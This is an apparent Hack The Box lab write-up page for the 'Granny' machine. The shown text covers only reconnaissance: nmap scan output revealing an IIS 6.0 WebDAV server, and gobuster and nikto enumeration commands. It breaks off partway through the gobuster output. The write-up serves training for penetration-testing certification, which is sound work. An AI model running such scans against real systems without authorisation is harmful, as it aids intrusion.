@@ -1,0 +1,1360 @@
+<!-- Fix MathJax rendering on iOS Safari due to rendering long numbers as phone numbers. -->
+
+
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+	
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+        <meta name="description" content="A compilation of writeups for the website- [**https://www.hackthebox.eu/](https://www.hackthebox.eu/**).">
+      
+      
+        <link rel="canonical" href="http://hackthebox-solutions.github.io/Retired/Granny Writeup/">
+      
+      
+        <meta name="author" content="Rushi Chaudhari">
+      
+      
+        <meta name="lang:clipboard.copy" content="Copy to clipboard">
+      
+        <meta name="lang:clipboard.copied" content="Copied to clipboard">
+      
+        <meta name="lang:search.language" content="en">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="No matching documents">
+      
+        <meta name="lang:search.result.one" content="1 matching document">
+      
+        <meta name="lang:search.result.other" content="# matching documents">
+      
+        <meta name="lang:search.tokenizer" content="[\s\-]+">
+      
+      <link rel="shortcut icon" href="../../assets/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+    
+	<meta name="format-detection" content="telephone=no">
+
+    
+      
+        <title>24. Granny Writeup.md - Hackthebox Solutions</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/application.1b62728e.css">
+      
+        <link rel="stylesheet" href="../../assets/stylesheets/application-palette.a8b3c06d.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="#009688">
+      
+    
+    
+      <script src="../../assets/javascripts/modernizr.268332fc.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
+    
+    
+      <link rel="stylesheet" href="../../css/katex.css">
+    
+      <link rel="stylesheet" href="../../css/custom.css">
+    
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css">
+    
+    
+      
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="teal" data-md-color-accent="blue">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448" viewBox="0 0 416 448" id="__github"><path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19T128 352t-18.125-8.5-10.75-19T96 304t3.125-20.5 10.75-19T128 256t18.125 8.5 10.75 19T160 304zm160 0q0 10-3.125 20.5t-10.75 19T288 352t-18.125-8.5-10.75-19T256 304t3.125-20.5 10.75-19T288 256t18.125 8.5 10.75 19T320 304zm40 0q0-30-17.25-51T296 232q-10.25 0-48.75 5.25Q229.5 240 208 240t-39.25-2.75Q130.75 232 120 232q-29.5 0-46.75 21T56 304q0 22 8 38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0 37.25-1.75t35-7.375 30.5-15 20.25-25.75T360 304zm56-44q0 51.75-15.25 82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5T212 416q-19.5 0-35.5-.75t-36.875-3.125-38.125-7.5-34.25-12.875T37 371.5t-21.5-28.75Q0 312 0 260q0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25 30.875Q171.5 96 212 96q37 0 70 8 26.25-20.5 46.75-30.25T376 64q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34 99.5z"/></svg>
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#reconnaissance" tabindex="1" class="md-skip">
+        Skip to content
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="http://hackthebox-solutions.github.io" title="Hackthebox Solutions" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon"></i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            <span class="md-header-nav__topic">
+              Hackthebox Solutions
+            </span>
+            <span class="md-header-nav__topic">
+              
+                24. Granny Writeup.md
+              
+            </span>
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            Type to start searching
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+        <div class="md-flex__cell md-flex__cell--shrink">
+          <div class="md-header-nav__source">
+            
+
+
+  
+
+<a href="https://github.com/hackthebox-solutions/hackthebox-solutions.github.io/" title="Go to repository" class="md-source" data-md-source="github">
+  
+    <div class="md-source__icon">
+      <svg viewBox="0 0 24 24" width="24" height="24">
+        <use xlink:href="#__github" width="24" height="24"></use>
+      </svg>
+    </div>
+  
+  <div class="md-source__repository">
+    hackthebox-solutions.github.io
+  </div>
+</a>
+          </div>
+        </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+      <main class="md-main" role="main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="http://hackthebox-solutions.github.io" title="Hackthebox Solutions" class="md-nav__button md-logo">
+      
+        <i class="md-icon"></i>
+      
+    </a>
+    Hackthebox Solutions
+  </label>
+  
+    <div class="md-nav__source">
+      
+
+
+  
+
+<a href="https://github.com/hackthebox-solutions/hackthebox-solutions.github.io/" title="Go to repository" class="md-source" data-md-source="github">
+  
+    <div class="md-source__icon">
+      <svg viewBox="0 0 24 24" width="24" height="24">
+        <use xlink:href="#__github" width="24" height="24"></use>
+      </svg>
+    </div>
+  
+  <div class="md-source__repository">
+    hackthebox-solutions.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../.." title="Preface" class="md-nav__link">
+      Preface
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
+    
+    <label class="md-nav__link" for="nav-2">
+      I Retired
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        I Retired
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Access Writeup/" title="1. Access Writeup.md" class="md-nav__link">
+      1. Access Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Jerry Writeup/" title="2. Jerry Writeup.md" class="md-nav__link">
+      2. Jerry Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Blue Writeup wo Metasploit/" title="3. Blue Writeup w/o Metasploit.md" class="md-nav__link">
+      3. Blue Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Blocky Writeup/" title="4. Blocky Writeup.md" class="md-nav__link">
+      4. Blocky Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Calamity Writeup/" title="5. Calamity Writeup.md" class="md-nav__link">
+      5. Calamity Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Devoops Writeup/" title="6. Devoops Writeup.md" class="md-nav__link">
+      6. Devoops Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Apocalyst Writeup/" title="7. Apocalyst Writeup.md" class="md-nav__link">
+      7. Apocalyst Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Poison Writeup wo Metasploit/" title="8. Poison Writeup w/o Metasploit.md" class="md-nav__link">
+      8. Poison Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Postman Writeup/" title="9. Postman Writeup.md" class="md-nav__link">
+      9. Postman Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Beep Writeup/" title="10. Beep Writeup.md" class="md-nav__link">
+      10. Beep Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Help Writeup/" title="11. Help Writeup.md" class="md-nav__link">
+      11. Help Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Mirai Writeup/" title="12. Mirai Writeup.md" class="md-nav__link">
+      12. Mirai Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Curling Writeup/" title="13. Curling Writeup.md" class="md-nav__link">
+      13. Curling Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Nibbles Writeup wo Metasploit/" title="14. Nibbles Writeup w/o Metasploit.md" class="md-nav__link">
+      14. Nibbles Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Valentine Writeup wo Metasploit/" title="15. Valentine Writeup w/o Metasploit.md" class="md-nav__link">
+      15. Valentine Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Popcorn Writeups/" title="16. Popcorn Writeups.md" class="md-nav__link">
+      16. Popcorn Writeups.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Cronos Writeup/" title="17. Cronos Writeup.md" class="md-nav__link">
+      17. Cronos Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Legacy Writeup/" title="18. Legacy Writeup.md" class="md-nav__link">
+      18. Legacy Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Openadmin Writeup/" title="19. Openadmin Writeup.md" class="md-nav__link">
+      19. Openadmin Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Bank Writeup/" title="20. Bank Writeup.md" class="md-nav__link">
+      20. Bank Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Shocker Writeup wo Metasploit/" title="21. Shocker Writeup w/o Metasploit.md" class="md-nav__link">
+      21. Shocker Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Luke Writeup/" title="22. Luke Writeup.md" class="md-nav__link">
+      22. Luke Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Arctic Writeup wo Metasploit/" title="23. Arctic Writeup w/o Metasploit.md" class="md-nav__link">
+      23. Arctic Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        24. Granny Writeup.md
+      </label>
+    
+    <a href="./" title="24. Granny Writeup.md" class="md-nav__link md-nav__link--active">
+      24. Granny Writeup.md
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#reconnaissance" class="md-nav__link">
+    Reconnaissance
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    Enumeration
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#initial-foothold" class="md-nav__link">
+    Initial Foothold
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    Privilege Escalation
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#extra-content-metasploit-solution" class="md-nav__link">
+    Extra Content: Metasploit Solution
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lessons-learned" class="md-nav__link">
+    Lessons Learned
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    Conclusion
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Netmon Writeup/" title="25. Netmon Writeup.md" class="md-nav__link">
+      25. Netmon Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Sense Writeup wo Metasploit/" title="26. Sense Writeup w/o Metasploit.md" class="md-nav__link">
+      26. Sense Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Sunday Writeup wo Metasploit/" title="27. Sunday Writeup w/o Metasploit.md" class="md-nav__link">
+      27. Sunday Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Solidstate Writeup wo Metasploit/" title="28. Solidstate Writeup w/o Metasploit.md" class="md-nav__link">
+      28. Solidstate Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Celestial Writeup/" title="29. Celestial Writeup.md" class="md-nav__link">
+      29. Celestial Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Tenten Writeup/" title="30. Tenten Writeup.md" class="md-nav__link">
+      30. Tenten Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Optimum Writeup/" title="31. Optimum Writeup.md" class="md-nav__link">
+      31. Optimum Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Haircut Writeup/" title="32. Haircut Writeup.md" class="md-nav__link">
+      32. Haircut Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Irked Writeup/" title="33. Irked Writeup.md" class="md-nav__link">
+      33. Irked Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Chatterbox Writeup wo Metasploit/" title="34. Chatterbox Writeup w/o Metasploit.md" class="md-nav__link">
+      34. Chatterbox Writeup w/o Metasploit.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Bashed Writeup/" title="35. Bashed Writeup.md" class="md-nav__link">
+      35. Bashed Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Lame Writeup/" title="36. Lame Writeup.md" class="md-nav__link">
+      36. Lame Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Grandpa Writeup/" title="37. Grandpa Writeup.md" class="md-nav__link">
+      37. Grandpa Writeup.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Swagshop Writeup/" title="38. Swagshop Writeup.md" class="md-nav__link">
+      38. Swagshop Writeup.md
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#reconnaissance" class="md-nav__link">
+    Reconnaissance
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    Enumeration
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#initial-foothold" class="md-nav__link">
+    Initial Foothold
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    Privilege Escalation
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#extra-content-metasploit-solution" class="md-nav__link">
+    Extra Content: Metasploit Solution
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lessons-learned" class="md-nav__link">
+    Lessons Learned
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    Conclusion
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/hackthebox-solutions/hackthebox-solutions.github.io/edit/master/docs/Retired/Granny Writeup.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
+                
+                
+                <p><img alt="" src="../../img/Granny Writeup/1_jWdo04_CL9kjnTeBjz8g_A.png" /></p>
+<p>This is the 34th blog out of a series of blogs I will be publishing on retired HTB machines in preparation for the OSCP. The full list of OSCP like machines compiled by <a href="https://twitter.com/TJ_Null">TJ_Null</a> can be found <a href="https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#">here</a>.</p>
+<p>Let’s get started!</p>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<p>Run the <a href="https://github.com/rkhal101/nmapAutomator">nmapAutomato</a>r script to enumerate open ports and services running on those ports.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>./nmapAutomator.sh 10.10.10.15 All
+</pre></div>
+
+<ul>
+<li><strong>All</strong>: Runs all the scans consecutively.</li>
+</ul>
+<p>We get back the following result.</p>
+<div class="highlight"><pre><span></span><span class="lineno" data-linenos="  1 "></span>Running all scans on 10.10.10.15
+<span class="lineno" data-linenos="  2 "></span>
+<span class="lineno" data-linenos="  3 "></span>Host is likely running Windows
+<span class="lineno" data-linenos="  4 "></span>
+<span class="lineno" data-linenos="  5 "></span>---------------------Starting Nmap Quick Scan---------------------
+<span class="lineno" data-linenos="  6 "></span>
+<span class="lineno" data-linenos="  7 "></span>Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-16 23:16 EST
+<span class="lineno" data-linenos="  8 "></span>Nmap scan report for 10.10.10.15
+<span class="lineno" data-linenos="  9 "></span>Host is up (0.043s latency).
+<span class="lineno" data-linenos=" 10 "></span>Not shown: 999 filtered ports
+<span class="lineno" data-linenos=" 11 "></span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+<span class="lineno" data-linenos=" 12 "></span>PORT   STATE SERVICE
+<span class="lineno" data-linenos=" 13 "></span>80/tcp open  http
+<span class="lineno" data-linenos=" 14 "></span>
+<span class="lineno" data-linenos=" 15 "></span>Nmap done: 1 IP address (1 host up) scanned in 6.17 seconds
+<span class="lineno" data-linenos=" 16 "></span>
+<span class="lineno" data-linenos=" 17 "></span>---------------------Starting Nmap Basic Scan---------------------
+<span class="lineno" data-linenos=" 18 "></span>
+<span class="lineno" data-linenos=" 19 "></span>Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-16 23:16 EST
+<span class="lineno" data-linenos=" 20 "></span>Nmap scan report for 10.10.10.15
+<span class="lineno" data-linenos=" 21 "></span>Host is up (0.036s latency).
+<span class="lineno" data-linenos=" 22 "></span>
+<span class="lineno" data-linenos=" 23 "></span>PORT   STATE SERVICE VERSION
+<span class="lineno" data-linenos=" 24 "></span>80/tcp open  http    Microsoft IIS httpd 6.0
+<span class="lineno" data-linenos=" 25 "></span>| http-methods: 
+<span class="lineno" data-linenos=" 26 "></span>|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
+<span class="lineno" data-linenos=" 27 "></span>|_http-server-header: Microsoft-IIS/6.0
+<span class="lineno" data-linenos=" 28 "></span>|_http-title: Under Construction
+<span class="lineno" data-linenos=" 29 "></span>| http-webdav-scan: 
+<span class="lineno" data-linenos=" 30 "></span>|   Server Type: Microsoft-IIS/6.0
+<span class="lineno" data-linenos=" 31 "></span>|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
+<span class="lineno" data-linenos=" 32 "></span>|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+<span class="lineno" data-linenos=" 33 "></span>|   WebDAV type: Unknown
+<span class="lineno" data-linenos=" 34 "></span>|_  Server Date: Mon, 17 Feb 2020 04:18:34 GMT
+<span class="lineno" data-linenos=" 35 "></span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+<span class="lineno" data-linenos=" 36 "></span>
+<span class="lineno" data-linenos=" 37 "></span>Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
+<span class="lineno" data-linenos=" 38 "></span>Nmap done: 1 IP address (1 host up) scanned in 10.82 seconds
+<span class="lineno" data-linenos=" 39 "></span>
+<span class="lineno" data-linenos=" 40 "></span>----------------------Starting Nmap UDP Scan----------------------
+<span class="lineno" data-linenos=" 41 "></span>
+<span class="lineno" data-linenos=" 42 "></span>Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-16 23:16 EST
+<span class="lineno" data-linenos=" 43 "></span>Nmap scan report for 10.10.10.15
+<span class="lineno" data-linenos=" 44 "></span>Host is up.
+<span class="lineno" data-linenos=" 45 "></span>All 1000 scanned ports on 10.10.10.15 are open|filtered
+<span class="lineno" data-linenos=" 46 "></span>
+<span class="lineno" data-linenos=" 47 "></span>Nmap done: 1 IP address (1 host up) scanned in 201.63 seconds
+<span class="lineno" data-linenos=" 48 "></span>
+<span class="lineno" data-linenos=" 49 "></span>---------------------Starting Nmap Full Scan----------------------
+<span class="lineno" data-linenos=" 50 "></span>
+<span class="lineno" data-linenos=" 51 "></span>Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-16 23:19 EST
+<span class="lineno" data-linenos=" 52 "></span>Initiating Parallel DNS resolution of 1 host. at 23:19
+<span class="lineno" data-linenos=" 53 "></span>Completed Parallel DNS resolution of 1 host. at 23:19, 0.02s elapsed
+<span class="lineno" data-linenos=" 54 "></span>Initiating SYN Stealth Scan at 23:19
+<span class="lineno" data-linenos=" 55 "></span>Scanning 10.10.10.15 [65535 ports]
+<span class="lineno" data-linenos=" 56 "></span>....
+<span class="lineno" data-linenos=" 57 "></span>Nmap scan report for 10.10.10.15
+<span class="lineno" data-linenos=" 58 "></span>Host is up (0.042s latency).
+<span class="lineno" data-linenos=" 59 "></span>Not shown: 65534 filtered ports
+<span class="lineno" data-linenos=" 60 "></span>PORT   STATE SERVICE
+<span class="lineno" data-linenos=" 61 "></span>80/tcp open  http
+<span class="lineno" data-linenos=" 62 "></span>
+<span class="lineno" data-linenos=" 63 "></span>Read data files from: /usr/bin/../share/nmap
+<span class="lineno" data-linenos=" 64 "></span>Nmap done: 1 IP address (1 host up) scanned in 262.89 seconds
+<span class="lineno" data-linenos=" 65 "></span>           Raw packets sent: 131269 (5.776MB) | Rcvd: 201 (8.844KB)
+<span class="lineno" data-linenos=" 66 "></span>
+<span class="lineno" data-linenos=" 67 "></span>No new ports
+<span class="lineno" data-linenos=" 68 "></span>
+<span class="lineno" data-linenos=" 69 "></span>---------------------Starting Nmap Vulns Scan---------------------
+<span class="lineno" data-linenos=" 70 "></span>
+<span class="lineno" data-linenos=" 71 "></span>Running CVE scan on basic ports
+<span class="lineno" data-linenos=" 72 "></span>
+<span class="lineno" data-linenos=" 73 "></span>Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-16 23:24 EST
+<span class="lineno" data-linenos=" 74 "></span>Nmap scan report for 10.10.10.15
+<span class="lineno" data-linenos=" 75 "></span>Host is up (0.037s latency).
+<span class="lineno" data-linenos=" 76 "></span>
+<span class="lineno" data-linenos=" 77 "></span>PORT   STATE SERVICE VERSION
+<span class="lineno" data-linenos=" 78 "></span>80/tcp open  http    Microsoft IIS httpd 6.0
+<span class="lineno" data-linenos=" 79 "></span>|_http-server-header: Microsoft-IIS/6.0
+<span class="lineno" data-linenos=" 80 "></span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+<span class="lineno" data-linenos=" 81 "></span>
+<span class="lineno" data-linenos=" 82 "></span>Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
+<span class="lineno" data-linenos=" 83 "></span>Nmap done: 1 IP address (1 host up) scanned in 9.48 seconds
+<span class="lineno" data-linenos=" 84 "></span>
+<span class="lineno" data-linenos=" 85 "></span>Running Vuln scan on basic ports
+<span class="lineno" data-linenos=" 86 "></span>
+<span class="lineno" data-linenos=" 87 "></span>Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-16 23:24 EST
+<span class="lineno" data-linenos=" 88 "></span>/usr/local/bin/nmapAutomator.sh: line 226:  2038 Segmentation fault      $nmapType -sV --script vuln -p$(echo &quot;${ports}&quot;) -oN nmap/Vulns_&quot;$1&quot;.nmap &quot;$1&quot;
+<span class="lineno" data-linenos=" 89 "></span>
+<span class="lineno" data-linenos=" 90 "></span>---------------------Recon Recommendations----------------------
+<span class="lineno" data-linenos=" 91 "></span>
+<span class="lineno" data-linenos=" 92 "></span>Web Servers Recon:
+<span class="lineno" data-linenos=" 93 "></span>
+<span class="lineno" data-linenos=" 94 "></span>gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.asp,.php -u [http://10.10.10.15:80](http://10.10.10.15:80) -o recon/gobuster_10.10.10.15_80.txt
+<span class="lineno" data-linenos=" 95 "></span>nikto -host 10.10.10.15:80 | tee recon/nikto_10.10.10.15_80.txt
+<span class="lineno" data-linenos=" 96 "></span>
+<span class="lineno" data-linenos=" 97 "></span>Which commands would you like to run?                                                                                                                                   
+<span class="lineno" data-linenos=" 98 "></span>All (Default), gobuster, nikto, Skip &lt;!&gt;
+<span class="lineno" data-linenos=" 99 "></span>
+<span class="lineno" data-linenos="100 "></span>Running Default in (1) s:
+<span class="lineno" data-linenos="101 "></span>
+<span class="lineno" data-linenos="102 "></span>---------------------Running Recon Commands----------------------
+<span class="lineno" data-linenos="103 "></span>
+<span class="lineno" data-linenos="104 "></span>Starting gobuster scan
+<span class="lineno" data-linenos="105 "></span>
+<span class="lineno" data-linenos="106 "></span>===============================================================
+<span class="lineno" data-linenos="107 "></span>Gobuster v3.0.1
+<span class="lineno" data-linenos="108 "></span>by OJ Reeves ([@TheColonial](http://twitter.com/TheColonial)) &amp; Christian Mehlmauer ([@_FireFart_](http://twitter.com/_FireFart_))
+<span class="lineno" data-linenos="109 "></span>===============================================================
+<span class="lineno" data-linenos="110 "></span>[+] Url:            [http://10.10.10.15:80](http://10.10.10.15:80)
+<span class="lineno" data-linenos="111 "></span>[+] Threads:        30
